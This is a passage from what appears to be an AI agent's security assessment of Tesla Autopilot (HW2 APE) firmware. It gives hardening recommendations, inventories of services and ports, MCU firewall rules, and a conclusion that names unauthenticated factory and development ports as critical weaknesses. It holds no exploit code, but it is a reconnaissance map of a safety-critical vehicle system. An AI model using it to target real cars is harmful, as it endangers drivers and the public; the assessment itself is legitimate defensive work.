7. **🟠 Implement Rate Limiting on Service APIs**
   - Prevent DoS via excessive requests
   - Example: 10 requests/minute per client certificate

8. **🟠 Enable AppArmor in All Modes (Including Factory)**
   - Remove `/sbin/unload-apparmor-in-factory` script
   - Create AppArmor profiles permissive enough for factory operations

---

### 12.3 Medium Priority (Within 90 Days)

9. **🟡 Network Segmentation: APE on Separate VLAN**
   ```
   VLAN 90: MCU/Gateway/Modem
   VLAN 91: APE-A
   VLAN 92: APE-B
   ```
   - Firewall rules between VLANs
   - Limits lateral movement if one APE is compromised

10. **🟡 Implement Intrusion Detection on APE**
    - Monitor for unexpected network connections
    - Alert on factory mode transitions
    - Log all service-api-tls authentication attempts

11. **🟡 Sign All Model Files & Calibration Data**
    - Cryptographic signatures on neural network weights
    - Verify before loading into autopilot stack
    - Prevents model tampering attacks

12. **🟡 Add Certificate Pinning to Service-API Clients**
    - MCU should only trust specific Tesla CA certificates
    - Reject self-signed certificates even if CN matches

---

### 12.4 Low Priority (Future Hardening)

13. **🟢 Move to Memory-Safe Language for New Services**
    - Existing: C++ (ui_server) → memory corruption risks
    - Future: Rust/Go for new autopilot components

14. **🟢 Implement Encrypted IPC (Data Value System)**
    - Currently shared memory is unencrypted
    - Add encryption layer to DV ringbuffers

15. **🟢 Hardware-Based Secure Boot Chain**
    - Verify APE firmware signature before boot
    - Prevent loading of modified Linux kernel or init system

16. **🟢 Regular Security Audits & Penetration Testing**
    - Annual third-party security assessment
    - Fuzzing of HTTP/JSON parsers
    - CAN bus injection testing

---

## Appendix A: Service Inventory

### Runit Services (`/etc/sv/`)

| Service | Binary | Port(s) | Function |
|---------|--------|---------|----------|
| **service-api-tls** | /usr/bin/service_api | 8081/tcp | TLS diagnostic API |
| **ui-server** | /opt/autopilot/bin/ui_server | Unknown | HTTP/WebSocket UI |
| **apeb-file-server** | /opt/autopilot/bin/apeb-file-server | 8902/tcp | Inter-APE file sharing |
| **canrx** | /opt/autopilot/bin/canrx | 27694/udp | CAN receive daemon |
| **cantx** | /opt/autopilot/bin/cantx | N/A | CAN transmit daemon |
| **autopilot** | /opt/autopilot/bin/autopilot_state_machine | N/A | Main autopilot logic |
| **camera** | /opt/autopilot/bin/camera | N/A | Camera input |
| **vision** | /opt/autopilot/bin/vision | 8610,8611/udp (dev) | Vision processing |
| **localizer** | /opt/autopilot/bin/localizer | N/A | GPS/IMU localization |
| **perception** | /opt/autopilot/bin/perception | N/A | Object detection |
| **mission-planner** | /opt/autopilot/bin/mission_planner | N/A | Route planning |
| **controller** | /opt/autopilot/bin/controller | N/A | Steering/throttle control |
| **hermes** | (unknown) | N/A | Telemetry uplink |
| **clip-logger** | /opt/autopilot/bin/clip_logger | N/A | Dashcam recording |
| **factory-camera-calibration** | /opt/autopilot/bin/factory_camera_calibration | 8901/tcp (part of service_api?) | Factory calibration |
| **sshd** | /usr/sbin/sshd | 22/tcp (likely disabled in prod) | SSH server |
| **watchdog** | (unknown) | N/A | System watchdog |

---

## Appendix B: Network Port Summary

### Production Ports (Confirmed Open)

| Port | Proto | Service | Auth | Exposure |
|------|-------|---------|------|----------|
| 27694 | UDP | canrx | None (source IP filtered) | 192.168.90.104 only |
| 28205 | UDP | Aurix logging | None (source IP filtered) | 192.168.90.104 only |
| 8902 | TCP | apeb-file-server | None (source IP filtered) | 192.168.90.105 only |
| 8081 | TCP | service-api-tls | **TLS mutual auth** | Any internal source (⚠️) |

### Development/Factory Ports (Should NOT be in Production)

| Port | Proto | Service | Risk |
|------|-------|---------|------|
| 8888 | TCP | logdash | 🟠 HIGH |
| 8082 | TCP | http-server | 🟠 HIGH |
| 8901 | TCP | Factory API | 🔴 **CRITICAL** |
| 9000 | TCP | Simulation control | 🔴 **CRITICAL** |
| 2049 | TCP | NFS server | 🔴 **CRITICAL** |
| 50051 | TCP | gRPC vision_graph_server | 🟠 HIGH |
| 7699 | TCP | WebSocket visualizer | 🟠 HIGH |

---

## Appendix C: Cross-References

### Related Documents

1. **[04-network-ports-firewall.md](04-network-ports-firewall.md)** - MCU2 network architecture
2. **[05-gap-analysis-missing-pieces.md](05-gap-analysis-missing-pieces.md)** - Factory mode endpoints
3. **[25-network-attack-surface.md](25-network-attack-surface.md)** - MCU ↔ APE attack vectors
4. **[31-apparmor-sandbox-security.md](31-apparmor-sandbox-security.md)** - AppArmor profiles

### MCU Firewall Rules Allowing APE Access

**From MCU side (192.168.90.100):**

```bash
# toolbox-api.iptables (MCU2 only - removed in Model 3/Y)
-A INPUT -i eth0 -p tcp -d 192.168.90.100 -m multiport --dports 4030,4035,4050,4060,4090,4094,7654 -j TOOLBOX-API-INPUT
-A TOOLBOX-API-INPUT -s 192.168.90.103,192.168.90.105 -j TOOLBOX-API-APE-INPUT
-A TOOLBOX-API-APE-INPUT -p tcp --dport 4030 -j ACCEPT
```

**Finding:** MCU2 (Model S/X) trusts APE for deep system access via Toolbox API. **Removed in Model 3/Y for security.**

---

## Appendix D: Glossary

| Term | Definition |
|------|------------|
| **APE** | Autopilot Processing Engine - NVIDIA Tegra-based Linux computer running autopilot stack |
| **HW2/HW2.5** | Tesla Autopilot Hardware 2.0 and 2.5 (NVIDIA Drive PX2 platform) |
| **MCU2** | Media Control Unit 2 (Intel Atom-based infotainment computer) |
| **DV (Data Value)** | Tesla's shared memory IPC system for inter-process communication |
| **Aurix** | Infineon TriCore microcontroller for safety-critical functions (192.168.90.104) |
| **Hermes** | Tesla's telemetry/logging framework |
| **Odin** | Tesla's factory diagnostic software suite |
| **Runit** | Init system used on APE (similar to systemd) |
| **AppArmor** | Mandatory Access Control (MAC) security framework |
| **TPM** | Trusted Platform Module - hardware security chip for key storage |

---

## Conclusion

The Tesla APE network attack surface is **well-designed for production use** with strong authentication (TLS mutual auth) on the primary diagnostic interface (port 8081). However, several **critical weaknesses exist**:

1. **Factory Mode API (port 8901)** is unauthenticated and exposes dangerous operations
2. **Development firewall** enables NFS, simulation control, and other risky services
3. **Bidirectional trust between MCU and APE** allows lateral movement if either is compromised
4. **AppArmor bypass in factory mode** reduces sandboxing effectiveness

**Overall Security Posture:**
- **Production:** 🟡 **MODERATE** (with critical recommendations implemented)
- **Factory/Development:** 🔴 **POOR** (intentionally permissive for testing - must not ship in vehicles)

**Key Recommendation:** Ensure production vehicles ship with production firewall, not development/factory firewall. Implement request signing for factory calibration endpoints if they must remain accessible.

---

**Analysis Completed:** February 3, 2026, 04:46 UTC  
**Analyst:** Security Platform Subagent (ape-network-services)  
**Firmware Source:** `/root/downloads/ape-extracted/` (HW2 APE firmware)  
**Next Steps:** Deep binary reverse engineering of service_api and ui_server for additional endpoint discovery
